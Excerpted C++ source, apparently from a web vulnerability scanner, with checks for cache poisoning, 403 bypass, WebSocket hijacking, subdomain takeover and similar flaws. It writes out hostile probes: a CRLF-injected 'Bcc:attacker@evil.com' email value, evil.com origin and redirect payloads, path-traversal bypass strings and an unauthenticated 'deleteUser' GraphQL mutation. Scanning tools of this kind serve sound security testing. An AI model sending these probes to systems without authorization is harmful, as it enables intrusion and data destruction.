...
std::vector<Finding> scan_nextjs_data(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  const std::vector<std::string> pii = {"password", "secret", "token", "apiKey", "api_key", "private"};

  for (const auto& url : crawl.urls) {
    auto resp = http.get(url);
    if (resp.body.find("__NEXT_DATA__") != std::string::npos || resp.body.find("__NUXT__") != std::string::npos) {
      for (const auto& s : pii) {
        if (resp.body.find(s) != std::string::npos) {
          findings.push_back(
              {"Next.js/Nuxt Data Leak", "high", url, "Sensitive data in SSR props: " + s, "", s, "__NEXT_DATA__ contains secrets"});
          return findings;
        }
      }
    }
...
std::vector<Finding> scan_source_maps(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  ...
  for (const auto& url : crawl.urls) {
    ...
    if (resp.status_code == 200 && resp.body.size() > 1000 && resp.body.find("sources") != std::string::npos) {
...
std::vector<Finding> scan_firebase_open(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  ...
  if (std::regex_search(resp.body, m, fb_re)) {
    ...
    if (fb_resp.status_code == 200 && fb_resp.body != "null" && fb_resp.body.size() > 5) {
      findings.push_back({"Firebase Open Database", "critical", fb_url, "Firebase database readable without authentication", "", "/.json",
...
/// S3 bucket listing.
std::vector<Finding> scan_s3_listing(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  ...
  while (it != end && findings.size() < 3) {
    ...
    if (checked.insert(bucket_url).second) {
      ...
      if (s3_resp.status_code == 200 && s3_resp.body.find("<ListBucketResult") != std::string::npos) {
        findings.push_back(
            {"S3 Bucket Listing", "high", bucket_url, "S3 bucket allows public listing", "", "", "ListBucketResult returned"});
      }
    }
    ++it;
  }
  ...
  for (const auto& path : targets) {
    ...
    for (const auto& ext : extensions) {
      ...
      if (deceptive.status_code == 200 && deceptive.body == normal.body) {
        ...
        if ((cache_header != deceptive.headers.end() && cache_header->second.find("HIT") != std::string::npos) ||
            (cf_cache != deceptive.headers.end() && cf_cache->second.find("HIT") != std::string::npos)) {
          findings.push_back({"Web Cache Deception", "high", base + path + ext, "Authenticated page cached with static extension", "", ext,
                              "Cache HIT on authenticated content"});
          return findings;
        }
      }
    }
...
std::vector<Finding> scan_jsonp_abuse(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  ...
  for (const auto& url : crawl.urls) {
    ...
    for (const auto& param : cb_params) {
      ...
      if (resp.status_code == 200 && resp.body.find("apex_callback(") != std::string::npos) {
        findings.push_back({"JSONP Callback Abuse", "medium", url, "JSONP endpoint reflects callback — potential data theft via XSS", param,
                            "apex_callback", "Response starts with callback function"});
        return findings;
      }
    }
  }
...
std::vector<Finding> scan_403_bypass(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  const std::vector<std::string> restricted = {"/admin", "/api/admin", "/internal", "/dashboard", "/manager"};
  ...
  for (const auto& path : restricted) {
    ...
    std::vector<Bypass> bypasses = {
        {base + path + "/.", "trailing dot"},       {base + path + "//", "double slash"},          {base + path + "/./", "dot slash"},
        {base + path + "%2f", "URL encoded slash"}, {base + path + "..;/", "semicolon traversal"}, {base + path + " ", "trailing space"},
    };
    ...
    for (const auto& bp : bypasses) {
      ...
      if (resp.status_code == 200 && resp.body.size() > 100 && resp.body.find("login") == std::string::npos) {
        findings.push_back({"403 Bypass: " + bp.name, "high", bp.url, "Access control bypassed via " + bp.name, "", bp.name,
...
std::vector<Finding> scan_websocket_hijack(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);
  ...
  if (resp.body.find("ws://") != std::string::npos || resp.body.find("wss://") != std::string::npos) {
    // Try WebSocket upgrade without Origin check
    auto ws_resp = http.get(base + "/ws", {{"Upgrade", "websocket"},
                                           {"Connection", "Upgrade"},
                                           {"Sec-WebSocket-Key", "dGVzdA=="},
                                           {"Sec-WebSocket-Version", "13"},
                                           {"Origin", "https://evil.com"}});
    if (ws_resp.status_code == 101 || ws_resp.headers.find("Sec-WebSocket-Accept") != ws_resp.headers.end()) {
      findings.push_back({"WebSocket Cross-Site Hijacking", "high", base + "/ws", "WebSocket accepts connections from arbitrary origins",
                          "Origin", "https://evil.com", "Upgrade accepted from evil.com"});
    }
  }
  return findings;
}
...
std::vector<Finding> scan_csp_bypass(const Config&, HttpClient& http, const CrawlResult& crawl) {
  ...
  if (csp == resp.headers.end()) {
    findings.push_back({"No CSP Header", "medium", crawl.urls[0], "No Content-Security-Policy header — XSS not mitigated", "", "", ""});
    return findings;
  }
  ...
  if (policy.find("unsafe-inline") != std::string::npos) {
    findings.push_back({"CSP allows unsafe-inline", "medium", crawl.urls[0], "CSP permits inline scripts — XSS still exploitable", "", "",
                        "Content-Security-Policy contains unsafe-inline"});
  }
  if (policy.find("unsafe-eval") != std::string::npos) {
    findings.push_back({"CSP allows unsafe-eval", "medium", crawl.urls[0], "CSP permits eval() — code injection possible", "", "",
                        "Content-Security-Policy contains unsafe-eval"});
  }
  if (policy.find("data:") != std::string::npos) {
    findings.push_back({"CSP allows data: URIs", "low", crawl.urls[0], "CSP permits data: scheme — potential XSS vector", "", "", ""});
  }
  // Check for JSONP-capable CDNs in whitelist
  const std::vector<std::string> jsonp_cdns = {"googleapis.com", "cdnjs.cloudflare.com", "ajax.googleapis.com"};
  for (const auto& cdn : jsonp_cdns) {
    if (policy.find(cdn) != std::string::npos) {
      findings.push_back({"CSP JSONP Bypass Vector", "medium", crawl.urls[0], "CSP whitelists " + cdn + " which has JSONP endpoints", "",
...
std::vector<Finding> scan_email_header_injection(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  const std::vector<std::string> contact_paths = {"/api/contact", "/contact", "/api/feedback", "/api/support"};

  std::string inject_email = "test@test.com%0d%0aBcc:attacker@evil.com";

  for (const auto& path : contact_paths) {
    auto resp = http.post(base + path, R"({"email":")" + inject_email + R"(","message":"test"})", "application/json");
    if (resp.status_code == 200 && resp.body.find("error") == std::string::npos && resp.body.find("invalid") == std::string::npos) {
      findings.push_back({"Email Header Injection", "medium", base + path, "CRLF in email field may inject mail headers", "email",
                          inject_email, "Server accepted CRLF in email parameter"});
      break;
    }
  }
  return findings;
...
std::vector<Finding> scan_clickjacking_deep(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  ...
  bool protected_csp = csp != resp.headers.end() && csp->second.find("frame-ancestors") != std::string::npos;

  if (!protected_xfo && !protected_csp) {
    // Check if there's actual sensitive content to frame
    if (resp.body.find("form") != std::string::npos || resp.body.find("button") != std::string::npos) {
...
std::vector<Finding> scan_dangling_cname(const Config& cfg, HttpClient& http, const CrawlResult&) {
  std::vector<Finding> findings;
  ...
  const std::vector<std::string> takeover_services = {"amazonaws.com", "herokuapp.com", "github.io",   "shopify.com",
  ...
  for (const auto& svc : takeover_services) {
    if (cname.find(svc) != std::string::npos) {
      ...
      if (resp.status_code == 404 || resp.status_code == 0 || resp.body.find("no such app") != std::string::npos ||
          resp.body.find("There isn't a GitHub Pages") != std::string::npos || resp.body.find("NoSuchBucket") != std::string::npos) {
        findings.push_back({"Subdomain Takeover (CNAME)", "critical", cfg.target, "Dangling CNAME to " + svc + " — takeover possible", "",
                            cname.substr(0, 60), "Service returns error/404"});
      }
    }
  }
  return findings;
...
std::vector<Finding> scan_cache_poison_headers(const Config&, HttpClient& http, const CrawlResult& crawl) {
  ...
  for (const auto& url : crawl.urls) {
    ...
    for (const auto& [header, value] : poison_headers) {
      ...
      if (resp.status_code == 200 && resp.body != baseline.body && resp.body.find(value) != std::string::npos) {
        findings.push_back({"Cache Poisoning via " + header, "high", url, "Response changes with unkeyed header — cacheable?", header,
                            value, "Injected value reflected in response"});
        return findings;
      }
    }
  }
...
std::vector<Finding> scan_meta_redirect(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  ...
  for (const auto& url : crawl.urls) {
    for (const auto& param : redirect_params) {
      ...
      if (resp.status_code == 200 && (resp.body.find("url=https://evil.com") != std::string::npos ||
                                      resp.body.find("location.href='https://evil.com'") != std::string::npos ||
                                      resp.body.find("window.location=\"https://evil.com\"") != std::string::npos)) {
        findings.push_back({"Open Redirect (Meta/JS)", "medium", url, "Redirect via meta refresh or JS with param: " + param, param,
                            "https://evil.com", "Redirect URL in page body"});
        return findings;
      }
    }
  }
...
std::vector<Finding> scan_graphql_mutation_noauth(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);
  ...
  for (const auto& path : gql_paths) {
    ...
    auto mut = http.post(base + path, R"({"query":"mutation { deleteUser(id: \"1\") { id } }"})", "application/json");
    if (mut.status_code == 200 && mut.body.find("unauthorized") == std::string::npos && mut.body.find("forbidden") == std::string::npos &&
        mut.body.find("error") == std::string::npos) {
      findings.push_back({"GraphQL Mutation Without Auth", "high", base + path, "Destructive mutations accepted without authentication", "",
                          "deleteUser mutation", "No auth error on mutation"});
    }
    break;
  }
  return findings;
